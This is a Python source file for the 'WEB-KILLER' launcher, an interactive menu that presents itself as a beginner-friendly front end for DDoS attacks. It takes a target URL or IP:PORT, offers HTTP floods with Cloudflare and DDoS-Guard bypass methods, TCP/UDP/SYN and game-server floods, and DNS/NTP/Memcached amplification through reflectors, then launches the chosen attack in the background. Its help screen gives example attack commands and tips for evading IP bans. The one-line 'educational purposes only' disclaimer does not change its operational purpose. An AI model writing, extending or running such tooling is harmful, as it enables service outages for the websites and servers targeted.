#!/usr/bin/env python3
"""
WEB-KILLER Interactive Launcher
User-friendly interface for WEB-KILLER DDoS Tool
"""

import os
import sys
import subprocess
import time
from pathlib import Path

# Color definitions
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    ORANGE = '\033[38;5;208m'
    PINK = '\033[38;5;206m'
    LIME = '\033[38;5;46m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'

def clear_screen():
    """Clear the terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Display the main ASCII banner"""
    banner = f"""
{Colors.RED}██╗    ██╗███████╗██████╗       ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
{Colors.RED}██║    ██║██╔════╝██╔══██╗      ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
{Colors.YELLOW}██║ █╗ ██║█████╗  ██████╔╝█████╗█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
{Colors.YELLOW}██║███╗██║██╔══╝  ██╔══██╗╚════╝██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
{Colors.GREEN}╚███╔███╔╝███████╗██████╔╝      ██║  ██╗██║███████╗███████╗███████╗██║  ██║
{Colors.GREEN} ╚══╝╚══╝ ╚══════╝╚═════╝       ╚══╝  ╚══╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
{Colors.CYAN}                    {Colors.WHITE}BEGINNER FRIENDLY LAUNCHER{Colors.CYAN}                        
{Colors.CYAN}              {Colors.WHITE}Easy DDoS Attack Interface{Colors.CYAN}                                  
{Colors.CYAN}
{Colors.RESET}"""
    print(banner)

def print_menu():
    """Display the main menu"""
    menu = f"""
{Colors.CYAN}                      {Colors.WHITE}MAIN MENU{Colors.CYAN}                                
{Colors.CYAN} {Colors.GREEN}[1]{Colors.WHITE} Layer7 Attack     {Colors.DIM}(HTTP/HTTPS Flood){Colors.CYAN}                     
{Colors.CYAN} {Colors.GREEN}[2]{Colors.WHITE} Layer4 Attack     {Colors.DIM}(TCP/UDP/SYN Flood){Colors.CYAN}                     
{Colors.CYAN} {Colors.GREEN}[3]{Colors.WHITE} Amplification     {Colors.DIM}(DNS/NTP/MEM/etc){Colors.CYAN}                       
{Colors.CYAN} {Colors.GREEN}[4]{Colors.WHITE} Tools Console     {Colors.DIM}(Ping/Check/Info){Colors.CYAN}                       
{Colors.CYAN} {Colors.GREEN}[5]{Colors.WHITE} View Help         {Colors.DIM}(Usage & Methods){Colors.CYAN}                      
{Colors.CYAN} {Colors.GREEN}[6]{Colors.WHITE} Stop All Attacks  {Colors.DIM}(Emergency Stop){Colors.CYAN}                       
{Colors.CYAN} {Colors.GREEN}[0]{Colors.WHITE} Exit              {Colors.DIM}(Quit Program){Colors.CYAN}                         
{Colors.RESET}"""
    print(menu)

def get_script_path():
    """Get the path to run.py"""
    return Path(__file__).parent / "run.py"

def get_python_path():
    """Get the Python executable path"""
    # Try to find Python in common locations
    possible_paths = [
        Path.home() / "AppData/Local/Programs/Python/Python314/python.exe",
        Path.home() / "AppData/Local/Programs/Python/Python313/python.exe",
        Path.home() / "AppData/Local/Programs/Python/Python312/python.exe",
        Path.home() / "AppData/Local/Programs/Python/Python311/python.exe",
        "python3",
        "python"
    ]
    
    for path in possible_paths:
        try:
            if isinstance(path, Path) and path.exists():
                return str(path)
            elif not isinstance(path, Path):
                subprocess.run([path, "--version"], capture_output=True)
                return path
        except:
            continue
    
    return "python"  # fallback

def run_attack(command):
    """Run an attack command in the background"""
    python = get_python_path()
    script = get_script_path()
    
    if not script.exists():
        print(f"\n{Colors.RED}[ERROR] start.py not found!{Colors.RESET}")
        print(f"{Colors.YELLOW}Make sure start.py is in the same directory as this launcher.{Colors.RESET}")
        input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
        return
    
    full_command = f'{python} "{script}" {command}'
    
    print(f"\n{Colors.CYAN}")
    print(f"{Colors.CYAN} {Colors.GREEN}Starting Attack...{Colors.CYAN}                                          ")
    print(f"{Colors.CYAN} {Colors.DIM}Command: {full_command[:50]}...{Colors.CYAN}         ")
    print(f"{Colors.CYAN}{Colors.RESET}\n")
    
    try:
        # Run in background
        if os.name == 'nt':  # Windows
            subprocess.Popen(full_command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
        else:  # Linux/Mac
            subprocess.Popen(full_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print(f"{Colors.GREEN}[✓] Attack launched successfully!{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Check the new window for attack status.{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[✗] Failed to launch attack: {e}{Colors.RESET}")
    
    input(f"\n{Colors.DIM}Press Enter to return to menu...{Colors.RESET}")

def layer7_menu():
    """Layer7 attack configuration menu"""
    while True:
        clear_screen()
        print_banner()
        
        print(f"\n{Colors.CYAN}")
        print(f"{Colors.CYAN}           {Colors.WHITE}LAYER7 ATTACK MENU{Colors.CYAN}                            ")
        print(f"{Colors.CYAN}...............................................................................")
        print(f"{Colors.CYAN} {Colors.GREEN}Available Methods:{Colors.CYAN}                                          ")
        print(f"{Colors.CYAN} {Colors.WHITE}GET, POST, HEAD, CFB, CFBUAM, BYPASS, OVH{Colors.CYAN}                  ")
        print(f"{Colors.CYAN} {Colors.WHITE}STRESS, DYN, SLOW, NULL, COOKIE, PPS, EVEN{Colors.CYAN}               ")
        print(f"{Colors.CYAN} {Colors.WHITE}GSB, DGB, AVB, APACHE, XMLRPC, BOT, BOMB{Colors.CYAN}                ")
        print(f"{Colors.CYAN} {Colors.WHITE}DOWNLOADER, KILLER, TOR, RHEX, STOMP{Colors.CYAN}                     ")
        print(f"{Colors.CYAN}{Colors.RESET}")
        
        print(f"\n{Colors.YELLOW}[?] Enter attack details:{Colors.RESET}")
        
        # Get target URL
        target = input(f"{Colors.GREEN}[>] Target URL (e.g., http://example.com): {Colors.RESET}").strip()
        if target.lower() == 'back':
            break
        if not target:
            print(f"{Colors.RED}[!] Target URL is required!{Colors.RESET}")
            time.sleep(1)
            continue
        
        if not target.startswith('http'):
            target = 'http://' + target
            print(f"{Colors.YELLOW}[i] Added http:// prefix: {target}{Colors.RESET}")
        
        # Get method
        print(f"\n{Colors.YELLOW}[?] Select Attack Method:{Colors.RESET}")
        print(f"{Colors.WHITE}  1. GET     (Standard HTTP flood)")
        print(f"  2. POST    (HTTP flood with data)")
        print(f"  3. CFB     (Cloudflare bypass)")
        print(f"  4. CFBUAM  (Cloudflare UAM bypass)")
        print(f"  5. BYPASS  (Request-based bypass)")
        print(f"  6. OVH     (OVH-specific attack)")
        print(f"  7. STRESS  (High-stress POST flood)")
        print(f"  8. DGB     (DDoS-Guard bypass)")
        print(f"  9. BOT     (Search engine bot flood)")
        print(f"  10. Custom (Enter manually){Colors.RESET}")
        
        method_choice = input(f"{Colors.GREEN}[>] Choose (1-10): {Colors.RESET}").strip()
        
        method_map = {
            '1': 'GET', '2': 'POST', '3': 'CFB', '4': 'CFBUAM',
            '5': 'BYPASS', '6': 'OVH', '7': 'STRESS', '8': 'DGB',
            '9': 'BOT'
        }
        
        if method_choice == '10':
            method = input(f"{Colors.GREEN}[>] Enter method name: {Colors.RESET}").strip().upper()
        else:
            method = method_map.get(method_choice, 'GET')
        
        # Get threads
        print(f"\n{Colors.YELLOW}[?] Number of Threads:{Colors.RESET}")
        print(f"{Colors.WHITE}  Low: 100  |  Medium: 500  |  High: 1000{Colors.RESET}")
        threads = input(f"{Colors.GREEN}[>] Threads (default 500): {Colors.RESET}").strip()
        threads = threads if threads else "500"
        
        # Get RPC
        print(f"\n{Colors.YELLOW}[?] Requests Per Connection (RPC):{Colors.RESET}")
        print(f"{Colors.WHITE}  Low: 10  |  Medium: 50  |  High: 100{Colors.RESET}")
        rpc = input(f"{Colors.GREEN}[>] RPC (default 50): {Colors.RESET}").strip()
        rpc = rpc if rpc else "50"
        
        # Get duration
        print(f"\n{Colors.YELLOW}[?] Attack Duration:{Colors.RESET}")
        print(f"{Colors.WHITE}  Seconds (e.g., 60 for 1 minute, 300 for 5 minutes){Colors.RESET}")
        duration = input(f"{Colors.GREEN}[>] Duration in seconds (default 60): {Colors.RESET}").strip()
        duration = duration if duration else "60"
        
        # Get proxy type
        print(f"\n{Colors.YELLOW}[?] Proxy Type:{Colors.RESET}")
        print(f"{Colors.WHITE}  1. HTTP   4. SOCKS5   5. SOCKS4   0. ALL   6. RANDOM{Colors.RESET}")
        proxy_type = input(f"{Colors.GREEN}[>] Proxy type (0-6, default 0): {Colors.RESET}").strip()
        proxy_type = proxy_type if proxy_type else "0"
        
        # Get proxy list
        print(f"\n{Colors.YELLOW}[?] Proxy List File:{Colors.RESET}")
        print(f"{Colors.WHITE}  Default: proxies.txt (in files/proxies/)")
        print(f"  Type 'none' to run without proxies{Colors.RESET}")
        proxy_list = input(f"{Colors.GREEN}[>] Proxy file (default proxies.txt): {Colors.RESET}").strip()
        proxy_list = proxy_list if proxy_list else "proxies.txt"
        if proxy_list.lower() == 'none':
            proxy_list = "proxies.txt"
            proxy_type = "0"
        
        # Debug mode
        debug = input(f"\n{Colors.GREEN}[>] Enable debug mode? (y/N): {Colors.RESET}").strip().lower()
        debug_flag = " debug" if debug == 'y' else ""
        
        # Build command
        command = f"{method} {target} {proxy_type} {threads} {proxy_list} {rpc} {duration}{debug_flag}"
        
        # Confirm
        print(f"\n{Colors.CYAN}")
        print(f"{Colors.CYAN} {Colors.WHITE}Attack Configuration Summary:{Colors.CYAN}                              ")
        print(f"{Colors.CYAN}.......................................................................")
        print(f"{Colors.CYAN} {Colors.GREEN}Target:{Colors.WHITE}    {target[:40]}{Colors.CYAN} ")
        print(f"{Colors.CYAN} {Colors.GREEN}Method:{Colors.WHITE}    {method}{Colors.CYAN}                                ")
        print(f"{Colors.CYAN} {Colors.GREEN}Threads:{Colors.WHITE}   {threads}{Colors.CYAN}                                     ")
        print(f"{Colors.CYAN} {Colors.GREEN}RPC:{Colors.WHITE}       {rpc}{Colors.CYAN}                                     ")
        print(f"{Colors.CYAN} {Colors.GREEN}Duration:{Colors.WHITE}  {duration}s{Colors.CYAN}                                   ")
        print(f"{Colors.CYAN} {Colors.GREEN}Proxy:{Colors.WHITE}     Type={proxy_type}, File={proxy_list}{Colors.CYAN}              ")
        print(f"{Colors.CYAN}{Colors.RESET}")
        
        confirm = input(f"\n{Colors.GREEN}[>] Launch attack? (Y/n): {Colors.RESET}").strip().lower()
        if confirm != 'n':
            run_attack(command)
        break

def layer4_menu():
    """Layer4 attack configuration menu"""
    while True:
        clear_screen()
        print_banner()
        
        print(f"\n{Colors.CYAN}")
        print(f"{Colors.CYAN}                   {Colors.WHITE}LAYER4 ATTACK MENU{Colors.CYAN}                            ")
        print(f"{Colors.CYAN}////////////////////////////////////////////////////////////////////////////////////////////")
        print(f"{Colors.CYAN} {Colors.GREEN}Available Methods:{Colors.CYAN}                                          ")
        print(f"{Colors.CYAN} {Colors.WHITE}TCP, UDP, SYN, ICMP, VSE, TS3, MCPE{Colors.CYAN}                     ")
        print(f"{Colors.CYAN} {Colors.WHITE}FIVEM, FIVEM-TOKEN, MINECRAFT, MCBOT{Colors.CYAN}                     ")
        print(f"{Colors.CYAN} {Colors.WHITE}CONNECTION, CPS, OVH-UDP{Colors.CYAN}                                ")
        print(f"{Colors.CYAN} {Colors.RESET}")
        
        print(f"\n{Colors.YELLOW}[?] Enter attack details:{Colors.RESET}")
        
        # Get target
        target = input(f"{Colors.GREEN}[>] Target IP:PORT (e.g., 192.168.1.1:80): {Colors.RESET}").strip()
        if target.lower() == 'back':
            break
        if not target or ':' not in target:
            print(f"{Colors.RED}[!] Valid IP:PORT is required!{Colors.RESET}")
            time.sleep(1)
            continue
        
        # Get method
        print(f"\n{Colors.YELLOW}[?] Select Attack Method:{Colors.RESET}")
        print(f"{Colors.WHITE}  1. TCP        (TCP connection flood)")
        print(f"  2. UDP        (UDP packet flood)")
        print(f"  3. SYN        (SYN packet flood)")
        print(f"  4. ICMP       (Ping flood)")
        print(f"  5. VSE        (Valve Source Engine)")
        print(f"  6. TS3        (TeamSpeak 3 flood)")
        print(f"  7. MINECRAFT  (Minecraft server flood)")
        print(f"  8. MCBOT      (Minecraft bot flood)")
        print(f"  9. CONNECTION (Connection flood)")
        print(f"  10. OVH-UDP   (OVH UDP flood)")
        print(f"  11. FIVEM     (FiveM server flood)")
        print(f"  12. Custom    (Enter manually){Colors.RESET}")
        
        method_choice = input(f"{Colors.GREEN}[>] Choose (1-12): {Colors.RESET}").strip()
        
        method_map = {
            '1': 'TCP', '2': 'UDP', '3': 'SYN', '4': 'ICMP',
            '5': 'VSE', '6': 'TS3', '7': 'MINECRAFT', '8': 'MCBOT',
            '9': 'CONNECTION', '10': 'OVH-UDP', '11': 'FIVEM'
        }
        
        if method_choice == '12':
            method = input(f"{Colors.GREEN}[>] Enter method name: {Colors.RESET}").strip().upper()
        else:
            method = method_map.get(method_choice, 'TCP')
        
        # Get threads
        print(f"\n{Colors.YELLOW}[?] Number of Threads:{Colors.RESET}")
        print(f"{Colors.WHITE}  Low: 10  |  Medium: 50  |  High: 100{Colors.RESET}")
        threads = input(f"{Colors.GREEN}[>] Threads (default 10): {Colors.RESET}").strip()
        threads = threads if threads else "10"
        
        # Get duration
        print(f"\n{Colors.YELLOW}[?] Attack Duration:{Colors.RESET}")
        print(f"{Colors.WHITE}  Seconds (e.g., 60 for 1 minute, 300 for 5 minutes){Colors.RESET}")
        duration = input(f"{Colors.GREEN}[>] Duration in seconds (default 60): {Colors.RESET}").strip()
        duration = duration if duration else "60"
        
        # Proxy options (only for supported methods)
        if method in ['TCP', 'MINECRAFT', 'MCBOT', 'CPS', 'CONNECTION']:
            use_proxy = input(f"\n{Colors.GREEN}[>] Use proxies? (y/N): {Colors.RESET}").strip().lower()
            if use_proxy == 'y':
                proxy_type = input(f"{Colors.GREEN}[>] Proxy type (1=HTTP, 4=SOCKS4, 5=SOCKS5): {Colors.RESET}").strip()
                proxy_list = input(f"{Colors.GREEN}[>] Proxy file (default proxies.txt): {Colors.RESET}").strip()
                proxy_list = proxy_list if proxy_list else "proxies.txt"
                command = f"{method} {target} {threads} {duration} {proxy_type} {proxy_list}"
            else:
                command = f"{method} {target} {threads} {duration}"
        else:
            command = f"{method} {target} {threads} {duration}"
        
        # Debug mode
        debug = input(f"\n{Colors.GREEN}[>] Enable debug mode? (y/N): {Colors.RESET}").strip().lower()
        if debug == 'y':
            command += " debug"
        
        # Confirm
        print(f"\n{Colors.CYAN}")
        print(f"{Colors.CYAN} {Colors.WHITE}Attack Configuration Summary:{Colors.CYAN}                              ")
        print(f"{Colors.CYAN}  ..................................................................................")
        print(f"{Colors.CYAN} {Colors.GREEN}Target:{Colors.WHITE}    {target}{Colors.CYAN}                              ")
        print(f"{Colors.CYAN} {Colors.GREEN}Method:{Colors.WHITE}    {method}{Colors.CYAN}                                ")
        print(f"{Colors.CYAN} {Colors.GREEN}Threads:{Colors.WHITE}   {threads}{Colors.CYAN}                                     ")
        print(f"{Colors.CYAN} {Colors.GREEN}Duration:{Colors.WHITE}  {duration}s{Colors.CYAN}                                   ")
        print(f"{Colors.CYAN}{Colors.RESET}")
        
        confirm = input(f"\n{Colors.GREEN}[>] Launch attack? (Y/n): {Colors.RESET}").strip().lower()
        if confirm != 'n':
            run_attack(command)
        break

def amp_menu():
    """Amplification attack configuration menu"""
    while True:
        clear_screen()
        print_banner()
        
        print(f"\n{Colors.CYAN}")
        print(f"{Colors.CYAN}                 {Colors.WHITE}AMPLIFICATION ATTACK MENU{Colors.CYAN}                      ")
        print(f"{Colors.CYAN}///////////////////////////////////////////////////////////////////////////////////////////")
        print(f"{Colors.CYAN} {Colors.YELLOW}[!] These methods require reflector servers!{Colors.CYAN}                 ")
        print(f"{Colors.CYAN} {Colors.GREEN}Available Methods:{Colors.CYAN}                                            ")
        print(f"{Colors.CYAN} {Colors.WHITE}DNS, NTP, MEM, CLDAP, CHAR, RDP, ARD{Colors.CYAN}                          ")
        print(f"{Colors.CYAN} {Colors.RESET}")
        
        print(f"\n{Colors.YELLOW}[?] Enter attack details:{Colors.RESET}")
        
        # Get target
        target = input(f"{Colors.GREEN}[>] Target IP:PORT (e.g., 192.168.1.1:80): {Colors.RESET}").strip()
        if target.lower() == 'back':
            break
        if not target or ':' not in target:
            print(f"{Colors.RED}[!] Valid IP:PORT is required!{Colors.RESET}")
            time.sleep(1)
            continue
        
        # Get method
        print(f"\n{Colors.YELLOW}[?] Select Amplification Method:{Colors.RESET}")
        print(f"{Colors.WHITE}  1. DNS     (DNS amplification)")
        print(f"  2. NTP     (NTP amplification)")
        print(f"  3. MEM     (Memcached amplification)")
        print(f"  4. CLDAP   (CLDAP amplification)")
        print(f"  5. CHAR    (Chargen amplification)")
        print(f"  6. RDP     (RDP amplification)")
        print(f"  7. ARD     (ARD amplification){Colors.RESET}")
        
        method_choice = input(f"{Colors.GREEN}[>] Choose (1-7): {Colors.RESET}").strip()
        
        method_map = {
            '1': 'DNS', '2': 'NTP', '3': 'MEM', '4': 'CLDAP',
            '5': 'CHAR', '6': 'RDP', '7': 'ARD'
        }
        
        method = method_map.get(method_choice, 'DNS')
        
        # Get threads
        print(f"\n{Colors.YELLOW}[?] Number of Threads:{Colors.RESET}")
        print(f"{Colors.WHITE}  Low: 5  |  Medium: 10  |  High: 20{Colors.RESET}")
        threads = input(f"{Colors.GREEN}[>] Threads (default 5): {Colors.RESET}").strip()
        threads = threads if threads else "5"
        
        # Get duration
        print(f"\n{Colors.YELLOW}[?] Attack Duration:{Colors.RESET}")
        duration = input(f"{Colors.GREEN}[>] Duration in seconds (default 60): {Colors.RESET}").strip()
        duration = duration if duration else "60"
        
        # Get reflector file
        print(f"\n{Colors.YELLOW}[?] Reflector Servers File:{Colors.RESET}")
        print(f"{Colors.WHITE}  File should contain IP addresses of vulnerable servers{Colors.RESET}")
        reflector_file = input(f"{Colors.GREEN}[>] Reflector file path: {Colors.RESET}").strip()
        
        if not reflector_file:
            print(f"{Colors.RED}[!] Reflector file is required for amplification attacks!{Colors.RESET}")
            time.sleep(1)
            continue
        
        # Build command
        command = f"{method} {target} {threads} {duration} {reflector_file}"
        
        # Debug mode
        debug = input(f"\n{Colors.GREEN}[>] Enable debug mode? (y/N): {Colors.RESET}").strip().lower()
        if debug == 'y':
            command += " debug"
        
        # Confirm
        print(f"\n{Colors.CYAN}")
        print(f"{Colors.CYAN} {Colors.WHITE}Attack Configuration Summary:{Colors.CYAN}                              ")
        print(f"{Colors.CYAN}........................................................................................")
        print(f"{Colors.CYAN} {Colors.GREEN}Target:{Colors.WHITE}    {target}{Colors.CYAN}                              ")
        print(f"{Colors.CYAN} {Colors.GREEN}Method:{Colors.WHITE}    {method}{Colors.CYAN}                                ")
        print(f"{Colors.CYAN} {Colors.GREEN}Threads:{Colors.WHITE}   {threads}{Colors.CYAN}                                     ")
        print(f"{Colors.CYAN} {Colors.GREEN}Duration:{Colors.WHITE}  {duration}s{Colors.CYAN}                                   ")
        print(f"{Colors.CYAN} {Colors.GREEN}Reflector:{Colors.WHITE} {reflector_file}{Colors.CYAN}                          ")
        print(f"{Colors.CYAN}{Colors.RESET}")
        
        confirm = input(f"\n{Colors.GREEN}[>] Launch attack? (Y/n): {Colors.RESET}").strip().lower()
        if confirm != 'n':
            run_attack(command)
        break

def tools_menu():
    """Tools console launcher"""
    clear_screen()
    print_banner()
    print(f"\n{Colors.YELLOW}[i] Launching Tools Console...{Colors.RESET}")
    print(f"{Colors.YELLOW}[i] Available tools: PING, CHECK, INFO, TSSRV, DSTAT{Colors.RESET}")
    print(f"{Colors.YELLOW}[i] Type BACK to return or EXIT to quit{Colors.RESET}\n")
    
    time.sleep(1)
    run_attack("TOOLS")

def stop_attacks():
    """Stop all running attacks"""
    clear_screen()
    print_banner()
    print(f"\n{Colors.RED}")
    print(f"{Colors.RED} {Colors.WHITE}STOPPING ALL ATTACKS...{Colors.RED}                                    ")
    print(f"{Colors.RED}{Colors.RESET}\n")
    
    run_attack("STOP")
    print(f"\n{Colors.GREEN}[✓] All attacks stopped!{Colors.RESET}")
    input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")

def view_help():
    """Display help information"""
    clear_screen()
    print_banner()
    print(f"\n{Colors.CYAN}")
    print(f"{Colors.CYAN}                     {Colors.WHITE}HELP & USAGE{Colors.CYAN}                               ")
    print(f"{Colors.CYAN}{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}Quick Start Guide:{Colors.RESET}")
    print(f"{Colors.WHITE}1. Select attack type from main menu")
    print(f"2. Enter target URL or IP:PORT")
    print(f"3. Choose attack method")
    print(f"4. Configure threads and duration")
    print(f"5. Launch attack\n")
    
    print(f"{Colors.YELLOW}Attack Types:{Colors.RESET}")
    print(f"{Colors.GREEN}Layer7:{Colors.WHITE} HTTP/HTTPS attacks (websites)")
    print(f"{Colors.GREEN}Layer4:{Colors.WHITE} TCP/UDP attacks (servers/games)")
    print(f"{Colors.GREEN}Amplification:{Colors.WHITE} Requires reflector servers\n")
    
    print(f"{Colors.YELLOW}Common Commands:{Colors.RESET}")
    print(f"{Colors.WHITE}  python start.py GET http://target.com 0 500 proxies.txt 50 60")
    print(f"  python start.py TCP 192.168.1.1:80 10 60")
    print(f"  python start.py DNS 192.168.1.1:53 5 60 reflectors.txt\n")
    
    print(f"{Colors.YELLOW}Pro Tips:{Colors.RESET}")
    print(f"{Colors.WHITE}• Use proxies for Layer7 attacks to avoid IP bans")
    print(f"• Start with low threads and increase gradually")
    print(f"• Monitor attack stats in the debug console")
    print(f"• Use TOOLS mode to check target status\n")
    
    print(f"{Colors.RED}⚠ WARNING: For educational purposes only!{Colors.RESET}")
    input(f"\n{Colors.DIM}Press Enter to return to menu...{Colors.RESET}")

def main():
    """Main program loop"""
    while True:
        clear_screen()
        print_banner()
        print_menu()
        
        choice = input(f"{Colors.GREEN}[>] Select option (0-6): {Colors.RESET}").strip()
        
        if choice == '1':
            layer7_menu()
        elif choice == '2':
            layer4_menu()
        elif choice == '3':
            amp_menu()
        elif choice == '4':
            tools_menu()
        elif choice == '5':
            view_help()
        elif choice == '6':
            stop_attacks()
        elif choice == '0':
            clear_screen()
            print_banner()
            print(f"\n{Colors.GREEN}")
            print(f"{Colors.GREEN} {Colors.WHITE}Thanks for using WEB-KILLER Launcher!{Colors.GREEN}                      ")
            print(f"{Colors.GREEN} {Colors.WHITE}POWERED BY ATHEX BLACK HAT {Colors.GREEN}                            ")
            print(f"{Colors.GREEN}{Colors.RESET}\n")
            sys.exit(0)
        else:
            print(f"\n{Colors.RED}[!] Invalid option! Please choose 0-6.{Colors.RESET}")
            time.sleep(1)

if __name__ == '__main__':
    try:
        # Check if start.py exists
        script_path = get_script_path()
        if not script_path.exists():
            print(f"{Colors.RED}[ERROR] run.py not found in {script_path.parent}{Colors.RESET}")
            print(f"{Colors.YELLOW}Main script Missing{Colors.RESET}")
            sys.exit(1)
        
        main()
    except KeyboardInterrupt:
        clear_screen()
        print_banner()
        print(f"\n{Colors.YELLOW}[!] Program interrupted by user.{Colors.RESET}")
        print(f"{Colors.GREEN}Goodbye!{Colors.RESET}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[ERROR] Unexpected error: {e}{Colors.RESET}")
        sys.exit(1)